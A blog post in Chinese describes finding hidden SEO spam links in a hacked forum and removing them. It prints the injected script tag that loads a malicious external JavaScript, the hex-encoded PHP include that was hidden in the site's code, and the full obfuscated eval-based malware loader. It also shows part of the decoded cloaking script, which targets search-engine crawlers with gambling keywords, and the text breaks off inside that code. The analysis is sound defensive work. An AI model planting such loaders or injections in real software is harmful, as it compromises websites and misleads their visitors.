<!DOCTYPE html>
<html lang="zh_CN">
  <head>
    <meta charset="utf-8"/>
    <title>论坛被挂暗链问题分析与解决 | 看看俺 – KanKanAn.com</title>
    <link rel="shortcut icon" href="/static/favicon.ico" />
    <link rel="stylesheet" type="text/less" href="/style/less/o-blog.less"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="generator" content="o-blog"/>
    <script src="/style/js/less-1.3.0.min.js" type="text/javascript"></script>
    <script src="/style/js/jquery-1.7.1.min.js" type="text/javascript"></script>
    <script src="/style/bootstrap/js/bootstrap-modal.js" type="text/javascript"></script>
    <script src="/style/bootstrap/js/bootstrap-transition.js" type="text/javascript"></script>
    <script src="/style/bootstrap/js/bootstrap-dropdown.js" type="text/javascript"></script>
    <script src="/style/bootstrap/js/bootstrap-collapse.js" type="text/javascript"></script>
    <script src="/style/js/prettify.js" type="text/javascript"></script>
    <script src="/style/js/o-blog.linenumber.js" type="text/javascript"></script>
    <script src="/style/js/o-blog-fix.js" type="text/javascript"></script>
  </head>
  <body>
    <div class="navbar navbar-fixed-top" id="header">
      <div class="navbar-inner">
	    <div class="container">
	      <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="/" style="line-height:100%;">看看俺 - KanKanAn.com</a>
	      <div class="nav-collapse collapse">
            <ul class="org-ul">
              <li><a href="/index.xml"><i class="icon-rss icon-white"></i> 订阅</a></li>
                
                <li><a href="/category/tech/0.html"><i class="icon-folder-close icon-white"></i> 技术</a></li>
            </ul>
	      </div>
	    </div>
      </div>
    </div>

    <div class="container container-fluid" id="page">
      <div class="push-header"></div>

      <div class="article">
        <header class="article-header">
          <h1>论坛被挂暗链问题分析与解决</h1>
      	<div class="qr-code">
      	  <img style="min-width:90px; min-height:90px; max-width:90px; max-height:90px;" src="" alt="" id="qr-code" />
      	  <script>
      	    document.getElementById("qr-code").src = "http://chart.apis.google.com/chart?chs=90x90&cht=qr&chld=|0&chl=" + encodeURIComponent(document.location.href);
      	  </script>
      	</div>
        </header>
      
        <div class="article-content">
          
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="static/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #ffc58f;">div</span> <span style="color: #ffeead;">style</span>='display:none'&gt;&lt;<span style="color: #ffc58f;">script</span> <span style="color: #ffeead;">language</span>='javascript' <span style="color: #ffeead;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #ffeead;">&amp;logo</span>=1' <span style="color: #ffeead;">charset</span>='gb2312'&gt;&lt;/<span style="color: #ffc58f;">script</span>&gt;&lt;/<span style="color: #ffc58f;">div</span>&gt;&lt;<span style="color: #ffc58f;">script</span> <span style="color: #ffeead;">type</span>='text/javascript' <span style="color: #ffeead;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #ffc58f;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #d1f1a9;">INCLUDE</span>(<span style="color: #ffffff; background-color: #002451;">pack(</span><span style="color: #99ffff;">'H*'</span>,<span style="color: #99ffff;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #ebbbff;">&lt;?php</span> $<span style="color: #ffeead;">O00OO0</span>=<span style="color: #ffffff; background-color: #002451;">urldecode(</span><span style="color: #99ffff;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="color: #99ffff; text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span style="text-decoration: underline;">);$</span><span style="color: #ffeead; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">=$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">6</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">30</span><span style="text-decoration: underline;">};$</span><span style="color: #ffeead; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">=$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">33</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">24</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">10</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #ffeead; text-decoration: underline;">OO0O00</span><span style="text-decoration: underline;">=$</span><span style="color: #ffeead; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">18</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">3</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">0</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O0OO00</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">24</span><span style="text-decoration: underline;">};$</span><span style="color: #ffeead; text-decoration: underline;">OO0000</span><span style="text-decoration: underline;">=$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">7</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">13</span><span style="text-decoration: underline;">};$</span><span style="color: #ffeead; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">.=$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">22</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">36</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">29</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">30</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">32</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">35</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">26</span><span style="text-decoration: underline;">}.$</span><span style="color: #ffeead; text-decoration: underline;">O00OO0</span><span style="text-decoration: underline;">{</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">30</span><span style="text-decoration: underline;">};</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">eval(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">O00O0O</span><span style="text-decoration: underline;">(</span><span style="color: #99ffff; text-decoration: underline;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span><span style="text-decoration: underline;">));</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #ebbbff;">&lt;?php</span>
<span style="color: #7285b7; font-style: italic;">/*</span>
<span style="color: #7285b7; font-style: italic;">*author:whoami</span>
<span style="color: #7285b7; font-style: italic;">*  QQ  :4892057</span>
<span style="color: #7285b7; font-style: italic;">*/</span>
<span style="color: #ffffff; background-color: #002451;">error_reporting(0</span>);
$<span style="color: #ffeead;">fileDir</span> = <span style="color: #99ffff;">'/var/tmp/.SYSDUMP/'</span>;
$<span style="color: #ffeead;">IP</span>=$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'REMOTE_ADDR'</span>];
$<span style="color: #ffeead;">Bot</span>=$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'HTTP_USER_AGENT'</span>];
$<span style="color: #ffeead;">Ref</span>=$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'HTTP_REFERER'</span>];
$<span style="color: #ffeead;">KIP</span>=<span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'117.28.255.37'</span>,<span style="color: #99ffff;">'116.55.241.24'</span>,<span style="color: #99ffff;">'125.64.94.219'</span>,<span style="color: #99ffff;">'119.147.114.213'</span>,<span style="color: #99ffff;">'11</span><span style="color: #99ffff; text-decoration: underline;">8.122.188.194'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'60.172.229.61'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'61.188.39.16'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'61.147.98.198'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'61.129.45.72'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'113.98.254.245'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'58.221.61.128'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'117.34.73.70'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #ffeead;">KBot</span>=<span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Baiduspider'</span>,<span style="color: #99ffff;">'Googlebot'</span>,<span style="color: #99ffff;">'Yahoo'</span>,<span style="color: #99ffff;">'Bingbot'</span>,<span style="color: #99ffff;">'Sosospider'</span>,<span style="color: #99ffff;">'Sogou'</span>,<span style="color: #99ffff;">'36</span><span style="color: #99ffff; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
$<span style="color: #ffeead;">Key</span>=<span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'anquan.org'</span>,<span style="color: #99ffff;">'google.com'</span>,<span style="color: #99ffff;">'soso.com'</span>,<span style="color: #99ffff;">'%e8%b5%8c'</span>,<span style="color: #99ffff;">'%e9%aa%b0'</span>,<span style="color: #99ffff;">'%e9%b1%</span><span style="color: #99ffff; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: 